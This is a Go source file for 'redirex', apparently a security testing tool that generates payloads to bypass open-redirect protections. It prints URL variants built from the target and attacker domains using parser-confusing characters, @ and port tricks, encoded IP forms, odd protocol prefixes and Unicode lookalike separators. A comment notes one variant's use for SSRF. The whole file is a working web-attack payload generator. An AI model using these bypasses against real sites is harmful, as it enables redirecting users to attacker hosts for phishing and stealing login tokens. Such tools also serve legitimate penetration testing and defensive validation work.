/*redirex is a tool to generate bypasses for open redirects

run with -h or --help for more info*/
package main

import (
	"flag"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"

	"github.com/dbzer0/ipfmt/src/ipfmt"
	tld "github.com/jpillora/go-tld"
)

func main() {
	target := flag.String("t", "target.tld", "targeted domain")
	attackerdomain := flag.String("a", "attacker.tld", "attackers domain")
	attackerIP := flag.String("ip", "127.0.0.1", "attackers IP")
	path := flag.String("path", "", "an allowed path like /callback")
	proto := flag.String("proto", "https://", "protocol of victims url")
	flag.Parse()

	//different ways to start a url
	protocols := []string{"//", "/%09/", "/\\"}
	//chars allowed in subdomains which might confuse parsers to think the host part ended (many only work in Safari)
	subdomainchars := []string{",", "&", "'", "\"", ";", "!", "$", "^", "*", "(", ")", "+", "`", "~", "-", "_", "=", "|", "{", "}", "%", "%01", "%02", "%03", "%04", "%05", "%06", "%07", "%08", "%0b", "%0c", "%0e", "%0f", "%10", "%11", "%12", "%13", "%14", "%15", "%16", "%17", "%18", "%19", "%1a", "%1b", "%1c", "%1d", "%1e", "%1f", "%7f"}
	//seperators between target and malicious
	seperators := []string{"@", "."}
	//chars that end the host part
	endhostchars := []string{"/", "?", "\\", "#"}

	//prepare hosts
	ip := net.ParseIP(*attackerIP)
	if ip == nil {
		fmt.Fprintln(os.Stderr, "Couldn't parse IP")
		return
	}
	ips := []string{ipfmt.ToInt(ip), ipfmt.ToHex(ip), ipfmt.ToOctal(ip), ipfmt.ToSingleHex(ip), ipfmt.Combo(ip), "1.1"}
	hostnames := []string{*attackerdomain}

	//contains
	fmt.Println("https://" + *attackerdomain + "/" + *proto + *target + *path)

	//% encoded
	fmt.Println(url.QueryEscape(*proto + *attackerdomain))
	fmt.Println(url.QueryEscape(url.QueryEscape(*proto + *attackerdomain)))

	//port as pass
	for _, host := range hostnames {
		fmt.Println(*proto + *target + ":443@" + host + *path)
	}

	//mutliple @s
	fmt.Println("https://" + *target + "@" + *target + "@" + *attackerdomain + *path)

	// unescaped dots in regexes /www.target.tld/ -> wwwxtarget.tld
	if hasSubdomain(*target) {
		fmt.Println(*proto + strings.Replace(*target, ".", "x", 1) + *path)
	} else {
		fmt.Println(*proto + "wwwx" + *target + *path)
	}

	for _, domain := range hostnames {
		//e.g. @attacker.tld
		for _, seperator := range seperators {
			fmt.Println(seperator + domain + *path)
		}
		//e.g. &.attacker.tld
		for _, char := range subdomainchars {
			fmt.Println(char + "." + domain + *path)
		}
	}

	for _, ip := range ips {
		//e.g. @1.1
		fmt.Println("@" + ip)
	}

	//e.g. /\attacker.tld
	for _, protocol := range protocols {
		for _, domain := range hostnames {
			fmt.Println(protocol + domain + *path)
		}
		for _, ip := range ips {
			fmt.Println(protocol + ip + *path)
		}
	}

	//e.g. https://target.tld@attacker.tld
	for _, seperator := range seperators {
		hostnames = append(hostnames, *target+seperator+*attackerdomain)
	}

	//e.g. https://attacker.tld#.target.tld
	for _, char := range endhostchars {
		hostnames = append(hostnames, *attackerdomain+char+"."+*target)
		//e.g. attacker.tld%EF%BC%8F.target.tld -> attacker.tld/.target.tld
		for _, sub := range unicodesubstitutions[[]rune(char)[0]] {
			hostnames = append(hostnames, *attackerdomain+string(sub)+"."+*target)
		}
	}

	//e.g. https://target.tld&.attacker.tld
	for _, char := range subdomainchars {
		hostnames = append(hostnames, *target+char+"."+*attackerdomain)
	}

	//e.g. https://attacker.tld
	for _, domain := range hostnames {
		fmt.Println(*proto + domain + *path)
	}

	//https://attacker.tld:target.tld this is more useful for ssrf
	//fmt.Println(*proto + *attackerdomain + ":" + *target + *path)
}

func hasSubdomain(domain string) bool {
	u, err := tld.Parse("http://" + domain)
	if err != nil {
		return false
	}
	return u.Subdomain != ""
}
